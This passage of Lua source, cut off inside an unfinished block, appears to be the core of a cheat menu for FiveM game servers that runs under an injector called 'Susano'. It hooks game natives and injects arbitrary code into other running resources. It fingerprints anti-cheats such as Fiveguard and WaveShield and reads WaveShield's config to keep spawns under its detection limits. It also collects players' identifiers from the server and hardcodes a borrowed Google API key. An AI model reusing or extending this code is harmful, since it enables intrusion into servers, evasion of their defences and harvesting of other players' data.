Original = {}

function validate_type(value, type_name)
    return type(value) == type_name
end

Original.BeginFrame = Susano.BeginFrame
Original.SubmitFrame = Susano.SubmitFrame
Original.ResetFrame = Susano.ResetFrame
Original.ResetAllFrames = Susano.ResetAllFrames
Original.DrawLine = Susano.DrawLine
Original.DrawRect = Susano.DrawRect
Original.DrawRectFilled = Susano.DrawRectFilled
Original.DrawCircle = Susano.DrawCircle
Original.DrawText = Susano.DrawText
Original.GetTextWidth = Susano.GetTextWidth
Original.WorldToScreen = Susano.WorldToScreen
Original.LoadFont = Susano.LoadFont
Original.LoadFontFromBuffer = Susano.LoadFontFromBuffer
Original.PushFont = Susano.PushFont
Original.PopFont = Susano.PopFont
Original.LoadTexture = Susano.LoadTexture
Original.LoadTextureFromBuffer = Susano.LoadTextureFromBuffer
Original.ReleaseTexture = Susano.ReleaseTexture
Original.DrawImage = Susano.DrawImage

function Susano.BeginFrame()
    return Original.BeginFrame()
end

function Susano.SubmitFrame()
    return Original.SubmitFrame()
end

function Susano.ResetFrame()
    return Original.ResetFrame()
end

function Susano.ResetAllFrames()
    return Original.ResetAllFrames()
end

function Susano.DrawLine(x1, y1, x2, y2, r, g, b, a, thickness)
    if not validate_type(x1, "number") then return end
    if not validate_type(y1, "number") then return end
    if not validate_type(x2, "number") then return end
    if not validate_type(y2, "number") then return end
    if not validate_type(r, "number") then return end
    if not validate_type(g, "number") then return end
    if not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    if not validate_type(thickness, "number") then return end
    return Original.DrawLine(x1, y1, x2, y2, r, g, b, a, thickness)
end

function Susano.DrawRect(x, y, w, h, r, g, b, a, thickness)
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(w, "number") then return end
    if not validate_type(h, "number") then return end
    if not validate_type(r, "number") then return end
    if not validate_type(g, "number") then return end
    if not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    if not validate_type(thickness, "number") then return end
    return Original.DrawRect(x, y, w, h, r, g, b, a, thickness)
end

function Susano.DrawRectFilled(x, y, w, h, r, g, b, a, rounding)
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(w, "number") then return end
    if not validate_type(h, "number") then return end
    if not validate_type(r, "number") then return end
    if not validate_type(g, "number") then return end
    if not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    if not validate_type(rounding, "number") then return end
    return Original.DrawRectFilled(x, y, w, h, r, g, b, a, rounding)
end

function Susano.DrawCircle(x, y, radius, filled, r, g, b, a, thickness, segments)
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(radius, "number") then return end
    if not validate_type(filled, "boolean") then return end
    if not validate_type(r, "number") then return end
    if not validate_type(g, "number") then return end
    if not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    if thickness ~= nil and not validate_type(thickness, "number") then return end
    if segments ~= nil and not validate_type(segments, "number") then return end
    return Original.DrawCircle(x, y, radius, filled, r, g, b, a, thickness, segments)
end

function Susano.DrawText(x, y, text, size_px, r, g, b, a)
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(text, "string") then return end
    if not validate_type(size_px, "number") then return end
    if not validate_type(r, "number") then return end
    if not validate_type(g, "number") then return end
    if not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    return Original.DrawText(x, y, text, size_px, r, g, b, a)
end

function Susano.GetTextWidth(text, size_px)
    if not validate_type(text, "string") then return end
    if not validate_type(size_px, "number") then return end
    return Original.GetTextWidth(text, size_px)
end

function Susano.WorldToScreen(x, y, z)
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(z, "number") then return end
    return Original.WorldToScreen(x, y, z)
end

function Susano.LoadFont(path, size_px)
    if not validate_type(path, "string") then return end
    if not validate_type(size_px, "number") then return end
    return Original.LoadFont(path, size_px)
end

function Susano.LoadFontFromBuffer(data, size_px)
    if not validate_type(data, "string") then return end
    if not validate_type(size_px, "number") then return end
    return Original.LoadFontFromBuffer(data, size_px)
end

function Susano.PushFont(fontId)
    if not validate_type(fontId, "number") then return end
    return Original.PushFont(fontId)
end

function Susano.PopFont()
    return Original.PopFont()
end

function Susano.LoadTexture(path)
    if not validate_type(path, "string") then return end
    return Original.LoadTexture(path)
end

function Susano.LoadTextureFromBuffer(data)
    if not validate_type(data, "string") then return end
    return Original.LoadTextureFromBuffer(data)
end

function Susano.ReleaseTexture(texId)
    if not validate_type(texId, "number") then return end
    return Original.ReleaseTexture(texId)
end

function Susano.DrawImage(texId, x, y, w, h, r, g, b, a, rounding, u0, v0, u1, v1)
    if not validate_type(texId, "number") then return end
    if not validate_type(x, "number") then return end
    if not validate_type(y, "number") then return end
    if not validate_type(w, "number") then return end
    if not validate_type(h, "number") then return end
    if r ~= nil and not validate_type(r, "number") then return end
    if g ~= nil and not validate_type(g, "number") then return end
    if b ~= nil and not validate_type(b, "number") then return end
    if a ~= nil and not validate_type(a, "number") then return end
    if rounding ~= nil and not validate_type(rounding, "number") then return end
    if u0 ~= nil and not validate_type(u0, "number") then return end
    if v0 ~= nil and not validate_type(v0, "number") then return end
    if u1 ~= nil and not validate_type(u1, "number") then return end
    if v1 ~= nil and not validate_type(v1, "number") then return end
    return Original.DrawImage(texId, x, y, w, h, r, g, b, a, rounding, u0, v0, u1, v1)
end

local HTTPGET = function(url)
    local st, body = Susano.HttpGet(url)
    return body
end


local old_susanodrawrect = Susano.DrawRectFilled
function Susano.DrawRectFilled(x, y, w, h, r, g, b, a, rounding)
    old_susanodrawrect(x, y, w, h, r, g, b, a, rounding or 0)
end

load([====[


local floor = math.floor
local char = string.char
local pack = string.pack
local concat = table.concat

Susano = Susano or {}

local GOOGLE_FONT_API_KEY = "AIzaSyDBzzPRqWl2eU_pBMDr_8mo1TbJgDkgst4" -- Got this from stackoverflow

FONT_FAMILY_CACHE = FONT_FAMILY_CACHE or {}
local function getFontFamily(font_family)
    if FONT_FAMILY_CACHE[font_family] then
        return table.unpack(FONT_FAMILY_CACHE[font_family])
    end

    local url = ("https://www.googleapis.com/webfonts/v1/webfonts?key=%s&family=%s"):format(GOOGLE_FONT_API_KEY,
        font_family)

    local success, response = Susano.HttpGet(url:gsub(" ", "+"))

    FONT_FAMILY_CACHE[font_family] = { success == 200, json.decode(response or "") or {} }

    return table.unpack(FONT_FAMILY_CACHE[font_family])
end

FONT_FILE_CACHE = FONT_FILE_CACHE or {}
local function getFontOfFamily(font_family, font_name)
    if font_name == "400" then
        font_name = "regular"
    end

    local cache_key = font_family .. "@" .. font_name
    if FONT_FILE_CACHE[cache_key] then
        return FONT_FILE_CACHE[cache_key]
    end

    local success, font_family_data = getFontFamily(font_family)
    if not success then return end
    if not font_family_data then return end
    if not font_family_data.items then return end
    if #font_family_data.items == 0 then return end

    local font_data = font_family_data.items[1]
    if not font_data.files then return end
    if not font_data.files[font_name] then
        if font_data.files["regular"] then
            font_name = "regular" -- fallback to regular if input isnt valid
        else
            return
        end
    end

    local s, font_bytes = Susano.HttpGet(font_data.files[font_name]) -- at this point it should always be 200 ngl
    FONT_FILE_CACHE[cache_key] = font_bytes

    return FONT_FILE_CACHE[cache_key]
end

FONT_INITED_CACHE = FONT_INITED_CACHE or {}
local function getFont(font_family, font_name, font_size)
    local cache_key = font_family .. "@" .. font_name .. "_" .. font_size
    if FONT_INITED_CACHE[cache_key] then
        return FONT_INITED_CACHE[cache_key]
    end

    local font = getFontOfFamily(font_family, font_name)
    if not font then return end

    local font_id = Susano.LoadFontFromBuffer(font, font_size)
    FONT_INITED_CACHE[cache_key] = font_id

    return FONT_INITED_CACHE[cache_key]
end

function DrawTextWithFont(x, y, text, font_family, font_name, size_px, r, g, b, a)
    local font_id = getFont(font_family, font_name, size_px)
    if not font_id then return end

    Susano.PushFont(font_id)
    Susano.DrawText(x, y, text, size_px, r, g, b, a)
    Susano.PopFont()
end

TEXT_WIDTH_CACHE = TEXT_WIDTH_CACHE or {}
function GetTextWidthWithFont(text, font_family, font_name, size_px)
    local cache_key = font_family .. "@" .. font_name .. "_" .. size_px .. "_" .. text
    if TEXT_WIDTH_CACHE[cache_key] then
        return TEXT_WIDTH_CACHE[cache_key]
    end

    local font_id = getFont(font_family, font_name, size_px)
    if not font_id then return end

    Susano.PushFont(font_id)
    local widht = Susano.GetTextWidth(text, size_px)
    Susano.PopFont()
    
    TEXT_WIDTH_CACHE[cache_key] = widht
    return widht
end

Susano.GetTextWidthWithFont = GetTextWidthWithFont
Susano.DrawTextWithFont = DrawTextWithFont


local function to255(c)
    local m = c or { 0, 0, 0, 255 }
    local out = {}
    for i = 1, 4 do
        local v = m[i]
        if v == nil then
            v = (i == 4) and 255 or 0
        end
        if v <= 1 then v = v * 255 end
        out[i] = floor(v + 0.5)
    end
    return out
end

local gradientTextureCache = {}

local function GenerateBMP32(width, height, pixels) -- https://wikipedia.org/wiki/Windows_Bitmap
    local imageSize = width * height * 4
    local fileSize = 54 + imageSize

    local header = ""
    header = header .. char(0x42, 0x4D)
    header = header .. pack("<I4", fileSize)
    header = header .. pack("<I4", 0)
    header = header .. pack("<I4", 54)
    header = header .. pack("<I4", 40)
    header = header .. pack("<i4", width)
    header = header .. pack("<i4", height)
    header = header .. pack("<I2", 1)
    header = header .. pack("<I2", 32)
    header = header .. pack("<I4", 0)
    header = header .. pack("<I4", imageSize)
    header = header .. pack("<i4", 2835)
    header = header .. pack("<i4", 2835)
    header = header .. pack("<I4", 0)
    header = header .. pack("<I4", 0)

    return header .. pixels
end

local function GenerateGradientTextureInternal(width, height, tl, tr, bl, br)
    tl = tl or { 0, 0, 0, 255 }
    tr = tr or tl
    bl = bl or tl
    br = br or tl

    if width < 1 or height < 1 then
        return nil
    end

    width = floor(width)
    height = floor(height)

    local cacheKey = string.format("%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s",
        width, height,
        tl[1], tl[2], tl[3], tl[4],
        tr[1], tr[2], tr[3], tr[4],
        bl[1], bl[2], bl[3], bl[4],
        br[1], br[2], br[3], br[4]
    )

    if gradientTextureCache[cacheKey] and gradientTextureCache[cacheKey].bmp then
        return gradientTextureCache[cacheKey].bmp
    end

    local pixels = {}
    local pixelCount = 0

    local invWidth = 1 / (width - 1)
    local invHeight = 1 / (height - 1)

    for y = height - 1, 0, -1 do
        local v = y * invHeight
        local v1 = 1 - v

        for x = 0, width - 1 do
            local u = x * invWidth
            local u1 = 1 - u

            local w_tl = u1 * v1
            local w_tr = u * v1
            local w_bl = u1 * v
            local w_br = u * v

            local r = floor(w_tl * tl[1] + w_tr * tr[1] + w_bl * bl[1] + w_br * br[1])
            local g = floor(w_tl * tl[2] + w_tr * tr[2] + w_bl * bl[2] + w_br * br[2])
            local b = floor(w_tl * tl[3] + w_tr * tr[3] + w_bl * bl[3] + w_br * br[3])
            local a = floor(w_tl * tl[4] + w_tr * tr[4] + w_bl * bl[4] + w_br * br[4])

            pixelCount = pixelCount + 1
            pixels[pixelCount] = char(b, g, r, a) -- BMP uses BGRA
        end
    end

    local bmpBytes = GenerateBMP32(width, height, concat(pixels))
    gradientTextureCache[cacheKey] = { bmp = bmpBytes }

    return bmpBytes
end

function GenerateGradientTexture(width, height, top_left, top_right, bottom_left, bottom_right)
    if width < 1 or height < 1 then return nil end

    local tl = to255(top_left)
    local tr = to255(top_right or top_left)
    local bl = to255(bottom_left or top_left)
    local br = to255(bottom_right or top_left)

    width = floor(width)
    height = floor(height)

    local cacheKey = string.format("%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s",
        width, height,
        tl[1], tl[2], tl[3], tl[4],
        tr[1], tr[2], tr[3], tr[4],
        bl[1], bl[2], bl[3], bl[4],
        br[1], br[2], br[3], br[4]
    )

    local entry = gradientTextureCache[cacheKey]
    if entry then
        if entry.tex then
            return entry.tex
        elseif entry.bmp then
            local tex = Susano.LoadTextureFromBuffer(entry.bmp)
            entry.tex = tex
            entry.bmp = nil
            return tex
        end
    end

    local bmpBytes = GenerateGradientTextureInternal(width, height, tl, tr, bl, br)
    if not bmpBytes then return nil end

    local tex = Susano.LoadTextureFromBuffer(bmpBytes)
    gradientTextureCache[cacheKey] = gradientTextureCache[cacheKey] or {}
    gradientTextureCache[cacheKey].tex = tex
    gradientTextureCache[cacheKey].bmp = nil

    return tex
end

Susano.GenerateGradientTexture = GenerateGradientTexture

function GenerateRoundedGradientTexture(width, height, top_left_color, top_right_color, bottom_left_color, bottom_right_color, roundness, corner_tl, corner_tr, corner_bl, corner_br)
    if width < 1 or height < 1 then return nil end

    local tl = to255(top_left_color)
    local tr = to255(top_right_color or top_left_color)
    local bl = to255(bottom_left_color or top_left_color)
    local br = to255(bottom_right_color or top_left_color)

    width = floor(width)
    height = floor(height)
    local radius = math.min(roundness or 0, width * 0.5, height * 0.5)

    corner_tl = corner_tl ~= false
    corner_tr = corner_tr ~= false
    corner_bl = corner_bl ~= false
    corner_br = corner_br ~= false

    local cacheKey = string.format("rounded_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s_%s",
        width, height, radius,
        tl[1], tl[2], tl[3], tl[4],
        tr[1], tr[2], tr[3], tr[4],
        bl[1], bl[2], bl[3], bl[4],
        br[1], br[2], br[3], br[4],
        tostring(corner_tl), tostring(corner_tr), tostring(corner_bl), tostring(corner_br)
    )

    local entry = gradientTextureCache[cacheKey]
    if entry then
        if entry.tex then
            return entry.tex
        elseif entry.bmp then
            local tex = Susano.LoadTextureFromBuffer(entry.bmp)
            entry.tex = tex
            entry.bmp = nil
            return tex
        end
    end

    local pixels = {}
    local pixelCount = 0
    local invWidth = 1 / (width - 1)
    local invHeight = 1 / (height - 1)

    for py = height - 1, 0, -1 do
        local v = py * invHeight
        local v1 = 1 - v

        for px = 0, width - 1 do
                    local u = px * invWidth
                    local u1 = 1 - u

                    local w_tl = u1 * v1
                    local w_tr = u * v1
                    local w_bl = u1 * v
                    local w_br = u * v

                    local r = floor(w_tl * tl[1] + w_tr * tr[1] + w_bl * bl[1] + w_br * br[1])
                    local g = floor(w_tl * tl[2] + w_tr * tr[2] + w_bl * bl[2] + w_br * br[2])
                    local b = floor(w_tl * tl[3] + w_tr * tr[3] + w_bl * bl[3] + w_br * br[3])
                    local a = floor(w_tl * tl[4] + w_tr * tr[4] + w_bl * bl[4] + w_br * br[4])

                    local alpha_mult = 1.0

                    if radius > 0 then
                        if corner_tl and px < radius and py < radius then
                            local dx = radius - px - 0.5
                            local dy = radius - py - 0.5
                            local dist = math.sqrt(dx * dx + dy * dy)
                            if dist > radius then
                                alpha_mult = 0
                            elseif dist > radius - 1 then
                                alpha_mult = radius - dist
                            end
                        end

                        if corner_tr and px >= width - radius and py < radius then
                            local dx = px - (width - radius - 1) - 0.5
                            local dy = radius - py - 0.5
                            local dist = math.sqrt(dx * dx + dy * dy)
                            if dist > radius then
                                alpha_mult = 0
                            elseif dist > radius - 1 then
                                alpha_mult = radius - dist
                            end
                        end

                        if corner_bl and px < radius and py >= height - radius then
                            local dx = radius - px - 0.5
                            local dy = py - (height - radius - 1) - 0.5
                            local dist = math.sqrt(dx * dx + dy * dy)
                            if dist > radius then
                                alpha_mult = 0
                            elseif dist > radius - 1 then
                                alpha_mult = radius - dist
                            end
                        end

                        if corner_br and px >= width - radius and py >= height - radius then
                            local dx = px - (width - radius - 1) - 0.5
                            local dy = py - (height - radius - 1) - 0.5
                            local dist = math.sqrt(dx * dx + dy * dy)
                            if dist > radius then
                                alpha_mult = 0
                            elseif dist > radius - 1 then
                                alpha_mult = radius - dist
                            end
                        end
                    end

                    a = floor(a * alpha_mult)

                    pixelCount = pixelCount + 1
                    pixels[pixelCount] = char(b, g, r, a)
                end
    end

    local bmpBytes = GenerateBMP32(width, height, concat(pixels))
    local tex = Susano.LoadTextureFromBuffer(bmpBytes)

    gradientTextureCache[cacheKey] = { tex = tex, bmp = nil }

    return tex
end

Susano.GenerateRoundedGradientTexture = GenerateRoundedGradientTexture

function DrawRoundedGradient(x, y, w, h, top_left_color, top_right_color, bottom_left_color, bottom_right_color, roundness, corner_tl, corner_tr, corner_bl, corner_br)
    local tex = GenerateRoundedGradientTexture(w, h, top_left_color, top_right_color, bottom_left_color, bottom_right_color, roundness, corner_tl, corner_tr, corner_bl, corner_br)
    if tex then
        Susano.DrawImage(tex, x, y, w, h, 1, 1, 1, 1)
    end
end

Susano.DrawRoundedGradient = DrawRoundedGradient

function DrawGradient(x, y, w, h, top_left, top_right, bottom_left, bottom_right, ...)
    local gradient_texture = GenerateGradientTexture(w, h, top_left, top_right, bottom_left, bottom_right)

    if gradient_texture then
        Susano.DrawImage(gradient_texture, x, y, w, h, 1, 1, 1, 1, ...)
    end
end

Susano.DrawGradient = DrawGradient



function Susano.DrawRoundedFilledRect(roundness, x, y, w, h, r, g, b, a, top_left, top_right, bottom_left, bottom_right, use_gradiant)
    local radius = math.min(roundness, w * 0.5, h * 0.5)
    if radius <= 0 then
        Susano.DrawRectFilled(x, y, w, h, r, g, b, a)
        return
    end

    local draw_tl = top_left ~= false
    local draw_tr = top_right ~= false
    local draw_bl = bottom_left ~= false
    local draw_br = bottom_right ~= false

    if draw_tl and draw_tr and draw_bl and draw_br then
        local col = {r,g,b,a}
        DrawGradient(x, y, w, h, col,col,col,col,roundness)
        return
    end
    if not draw_tl and not draw_tr and not draw_bl and not draw_br then
        Susano.DrawRectFilled(x, y, w, h, r, g, b, a, 0)
        return
    end

    local col = {r, g, b, a}
    Susano.DrawRoundedGradient(x, y, w, h, col, col, col, col, roundness, top_left, top_right, bottom_left, bottom_right)
end

]====])()

if Susano.HasNativeHookInitializationFailed() then
    local ScreenWidth, ScreenHeight = GetActiveScreenResolution()

    Susano.BeginFrame()
    local label = tostring(
        "Please restart your game and inject Susano before joining the Server.\n If you want to disable this message press 'Restart Environment'")
    local textH = 30
    local textW = Susano.GetTextWidthWithFont(label, "Bitcount Grid Single", "400", textH)
    local textr, textg, textb = 1, 1, 1

    local x, y = ScreenWidth / 2, ScreenHeight / 2

    Susano.DrawTextWithFont(x - (textW / 2), y, label, "Bitcount Grid Single", "400", textH, textr, textg, textb, 1)
    Susano.SubmitFrame()
    return
end

load([====[
Susano.Communication = {}
Susano.Communication.handlers = {}

local function GenerateRandomString(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local result = {}
    
    for i = 1, length do
        local rand = math.random(1, #chars)
        result[i] = chars:sub(rand, rand)
    end
    
    return table.concat(result)
end

Susano.Communication.Key = GenerateRandomString(16)
Susano.UnhookNative(0x6CCD2564)
Susano.HookNative(0x6CCD2564, function(key, data)
    if Susano.Communication.Key == key then
        local data = json.decode(data)
        local eventname = data.event;
--
        for i,v in pairs(Susano.Communication.handlers[eventname] or {}) do
            v(table.unpack(data.args))
        end
    end

    return true
end)

function Susano.Communication.register(eventName, func)
    if not Susano.Communication.handlers[eventName] then Susano.Communication.handlers[eventName] = {} end
    table.insert(Susano.Communication.handlers[eventName], func)
end

function Susano.Communication.Inject(resource, code)
    local stub = ([[
        local com = {}
        function com.call(eventName, ...)
            local tbl = {
                event = eventName,
                args = {...}
            }
            GetConvar('%s', json.encode(tbl))
        end
        print("Hello")
    ]]):format(Susano.Communication.Key)

    Susano.InjectResource(resource, stub .. "\n" .. code)
end

--Susano.Communication.register("ping", function (...)
--    print(...)
--end)
--
--Susano.Communication.Inject("monitor", [[
--    com.call("ping", GetCurrentResourceName())
--]])

]====])() -- susano com

CIST = load([====[

local CIST                           = {}

CIST.RATELIMITES                     = {}
CIST.RATELIMITES["Object"]           = math.huge
CIST.RATELIMITES["Ped"]              = math.huge
CIST.RATELIMITES["Vehicle"]          = math.huge
CIST.RATELIMITES["Projectile"]       = math.huge

CIST.LAST_SPAWN_TIME                 = {}
CIST.LAST_SPAWN_TIME["Object"]       = 0
CIST.LAST_SPAWN_TIME["Ped"]          = 0
CIST.LAST_SPAWN_TIME["Vehicle"]      = 0
CIST.LAST_SPAWN_TIME["Projectile"]   = 0

CIST.SPAWN_DELAY                     = {}
CIST.SPAWN_DELAY["Object"]           = 0
CIST.SPAWN_DELAY["Ped"]              = 0
CIST.SPAWN_DELAY["Vehicle"]          = 0
CIST.SPAWN_DELAY["Projectile"]       = 0

CIST.BLACKLISTED                     = {}
CIST.BLACKLISTED["Object"]           = {}
CIST.BLACKLISTED["Ped"]              = {}
CIST.BLACKLISTED["Vehicle"]          = {}
CIST.BLACKLISTED["Projectile"]       = {}

CIST.WHITELISTED                     = {}
CIST.WHITELISTED["Object"]           = {}
CIST.WHITELISTED["Ped"]              = {}
CIST.WHITELISTED["Vehicle"]          = {}
CIST.WHITELISTED["Projectile"]       = {}

function CIST:calculateSpawnDelay(entityType)
    local limit = self.RATELIMITES[entityType]
    if not limit or limit == math.huge or limit == 0 then
        self.SPAWN_DELAY[entityType] = 0
        return 0
    end
    
    local delay = math.floor((5000 / limit) + 20)
    self.SPAWN_DELAY[entityType] = delay
    return delay
end

-- Update all spawn delays when rate limits change
function CIST:updateAllSpawnDelays()
    self:calculateSpawnDelay("Object")
    self:calculateSpawnDelay("Ped")
    self:calculateSpawnDelay("Vehicle")
    self:calculateSpawnDelay("Projectile")
end

function CIST:canISpawn(entityType, hash)
    if not CIST.RATELIMITES[entityType] then return false end

    if type(hash) == "string" then
        hash = GetHashKey(hash)
    end

    -- Check blacklist
    if CIST.BLACKLISTED[entityType] and CIST.BLACKLISTED[entityType][hash] then
        return false, "BLACKLISTED"
    end

    -- Check whitelist
    if CIST.WHITELISTED[entityType] and next(CIST.WHITELISTED[entityType]) ~= nil then
        if not CIST.WHITELISTED[entityType][hash] then
            return false, "NOT_WHITELISTED"
        end
    end

    -- Check rate limit using timer-based approach
    local currentTime = GetGameTimer()
    local lastSpawnTime = CIST.LAST_SPAWN_TIME[entityType] or 0
    local spawnDelay = CIST.SPAWN_DELAY[entityType] or 0
    local timeSinceLastSpawn = currentTime - lastSpawnTime
    
    if timeSinceLastSpawn < spawnDelay then
        local waitTime = spawnDelay - timeSinceLastSpawn
        return false, "RATELIMITED", waitTime
    end

    -- Update last spawn time
    CIST.LAST_SPAWN_TIME[entityType] = currentTime
    return true, "SUCCESS"
end

function CIST:GetAvailabileVehicles()
    local result = {}

    if next(self.WHITELISTED["Vehicle"]) ~= nil then
        for hash, allowed in pairs(self.WHITELISTED["Vehicle"]) do
            if allowed then
                table.insert(result, hash)
            end
        end
    else
        if GetAllVehicleModels then
            local success, allModels = pcall(GetAllVehicleModels)
            if success and allModels then
                for _, name in ipairs(allModels) do
                    if name and GetHashKey then
                        local hash = GetHashKey(name)
                        if hash and not self.BLACKLISTED["Vehicle"][hash] then
                            table.insert(result, hash)
                        end
                    end
                end
            end
        end
    end

    return result
end


function CIST:InitWaveshield()
    local stateBagsGlobal = GetStateBagKeys("global")
    local stateBagName
    for _, name in pairs(stateBagsGlobal) do
        local val = GetStateBagValue("global", name)
        if type(val) == "table" and val['Main'] ~= nil and val['Beta'] ~= nil then
            stateBagName = name
        end
    end
    if not stateBagName then return end

    local config                   = GetStateBagValue("global", stateBagName)

    CIST.RATELIMITES["Object"]     = config["Entities"]["ObjectsLimitIn5Seconds"]
    CIST.RATELIMITES["Ped"]        = config["Entities"]["PedsLimitIn5Seconds"]
    CIST.RATELIMITES["Vehicle"]    = config["Entities"]["VehiclesLimitIn5Seconds"]
    CIST.RATELIMITES["Projectile"] = config["Entities"]["ProjectilesLimitIn5Seconds"]

    self:updateAllSpawnDelays()

    if config["Entities"]["EnableObjectsBlackList"] then
        for _, v in pairs(config["Entities"]["BlackListedObjects"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.BLACKLISTED["Object"][hash] = true
        end
    end

    if config["Entities"]["EnableObjectsWhiteList"] then
        for _, v in pairs(config["Entities"]["WhiteListedObjects"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.WHITELISTED["Object"][hash] = true
        end
    end

    if config["Entities"]["EnableVehiclesBlackList"] then
        for _, v in pairs(config["Entities"]["BlackListedVehicles"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.BLACKLISTED["Vehicle"][hash] = true
        end
    end

    if config["Entities"]["EnableVehiclesWhiteList"] then
        for _, v in pairs(config["Entities"]["WhiteListedVehicles"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.WHITELISTED["Vehicle"][hash] = true
        end
    end

    if config["Entities"]["EnablePedsBlackList"] then
        for _, v in pairs(config["Entities"]["BlackListedPeds"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.BLACKLISTED["Ped"][hash] = true
        end
    end

    if config["Entities"]["EnablePedsWhiteList"] then
        for _, v in pairs(config["Entities"]["WhiteListedPeds"]) do
            local hash = tonumber(v) or GetHashKey(v)
            CIST.WHITELISTED["Ped"][hash] = true
        end
    end
    print("[CIST] WaveShield initialization complete")
end

function CIST:spawnWithRateLimit(entityType, model, spawnCallback)
    local canSpawn, reason, waitTime = self:canISpawn(entityType, model)
    
    if not canSpawn then
        if reason == "RATELIMITED" and waitTime then
            print(string.format("[CIST] Rate limited for %s. Waiting %dms...", entityType, waitTime))
            Citizen.Wait(waitTime)
            canSpawn, reason, waitTime = self:canISpawn(entityType, model)
        end
        
        if not canSpawn then
            print(string.format("[CIST] Cannot spawn %s: %s", entityType, reason))
            return false, reason
        end
    end
    
    if spawnCallback then
        local success, result = pcall(spawnCallback, GetHashKey(model))
        if success then
            return true, result
        else
            print(string.format("[CIST] Spawn callback failed: %s", tostring(result)))
            return false, result
        end
    end
    
    return true, "SUCCESS"
end

function CIST:getSpawnDelay(entityType)
    return self.SPAWN_DELAY[entityType] or 0
end

function CIST:getTimeUntilNextSpawn(entityType)
    local currentTime = GetGameTimer()
    local lastSpawnTime = self.LAST_SPAWN_TIME[entityType] or 0
    local spawnDelay = self.SPAWN_DELAY[entityType] or 0
    local timeSinceLastSpawn = currentTime - lastSpawnTime
    
    if timeSinceLastSpawn >= spawnDelay then
        return 0
    end
    
    return spawnDelay - timeSinceLastSpawn
end

return CIST
]====])() -- CIST
CIST:InitWaveshield()

Utils = load([===[
local HTTPGET = function(url)
    local st, body = Susano.HttpGet(url)
    return body
end


local MachoUtils = {}
MachoUtils.ScriptRegistry = {}


---@param name string
---@param code string
---@param preferredResource string|table
function MachoUtils.RegisterScript(name, code, preferredResource)
    MachoUtils.ScriptRegistry[name] = {
        code = code,
        preferredResource = preferredResource
    }
end

function MachoUtils.InjectScript(name, resource, ...)
    local script = MachoUtils.ScriptRegistry[name]
    if not script then return print("Script not found:", name) end

    local targetResource = resource

    if not targetResource then
        local pref = script.preferredResource
        if type(pref) == "table" then
            for i = 1, #pref do
                if GetResourceState(pref[i]) == "started" then
                    targetResource = pref[i]
                    break
                end
            end
        elseif type(pref) == "string" then
            targetResource = pref
        end
    end

    if not targetResource then
        targetResource = "any"
    end

    if not targetResource then return print("No valid resource found for injection") end

    local args = { ... }
    local needed = select(2, string.gsub(script.code, '%%s', ''))
    if #args < needed then return print("InjectScript, doesn't have enough args") end

    for i, v in ipairs(args) do
        if type(v) == "string" then
            args[i] = string.format("'%s'", v)
        end
    end

    local code = #args > 0 and string.format(script.code, table.unpack(args)) or script.code
    Susano.InjectResource(targetResource, code)

    return targetResource
end

function MachoUtils.GetAllPlayers()
    local players_endpoint = "http://%s/players.json"
    local players_json = HTTPGET((players_endpoint):format(tostring(GetCurrentServerEndpoint())))

    local players = json.decode(players_json)

    local localplayer = PlayerId()
    local local_coords = GetEntityCoords(GetPlayerPed(localplayer))

    local plys = {}
    for _, player in ipairs(players) do
        local ply = {}

        ply.identifiers = player.identifiers
        ply.ping = player.ping
        ply.name = player.name
        ply.server_id = player.id
        ply.client_id = GetPlayerFromServerId(player.id)

        table.insert(plys, ply)
    end

    return plys
end

function MachoUtils.GetAntiCheats()
    local ACs_found = {}

    for i = 0, GetNumResources() do
        local resource = GetResourceByFindIndex(i);
        if resource ~= nil then -- man, why doesnt fivem have a continue statement
            local author = GetResourceMetadata(resource, "author", 0)
            local desc   = GetResourceMetadata(resource, "author", 0)
            local ac     = GetResourceMetadata(resource, "ac", 0) -- Yes, FG tells us directly

            local found  = false

            if ac == "fg" then
                table.insert(ACs_found, { "Fiveguard", resource })
            elseif string.find(resource, "EC_AC") then
                table.insert(ACs_found, { "EagleAC", resource })
            elseif author == "WaveShield" then
                table.insert(ACs_found, { "WaveShield", resource })
            elseif string.find(author or "", "reaperac.com") then
                table.insert(ACs_found, { "ReaperV4", resource })
            elseif string.find(author or "", "Electron") then
                table.insert(ACs_found, { "ElectronAC", resource })
            elseif resource == "hades" then
                table.insert(ACs_found, { "NarcoCity", resource })
            elseif desc then
                local stripped = desc:gsub("-", ""):lower()
                if stripped:find("anticheat") then
                    table.insert(ACs_found, { "UnknownAC", resource })
                end
            elseif string.find(resource, "_ac") then
                table.insert(ACs_found, { "UnknownAC", resource })
            end
        end
    end

    return ACs_found
end

local resFilters = {
    ["inventory"] = function(name)
        return string.find(name:lower(), "_inv") or string.find(name:lower(), "_inventory") or name:lower() == "inventory"
    end
}

function MachoUtils.GetResourceByFilter(filter)
    local num_res = GetNumResources() - 1;

    for i=0, num_res do
        local resource = GetResourceByFindIndex(i);
        if (resFilters[filter] or function() return end)(resource) then
            return resource
        end
    end
end

Utils = MachoUtils
return MachoUtils
]===])() -- Utils

load([====[
CIST = CIST or {}
Utils = Utils or {}


local function CheckResource(resource)
    return GetResourceState(resource) == "started"
end

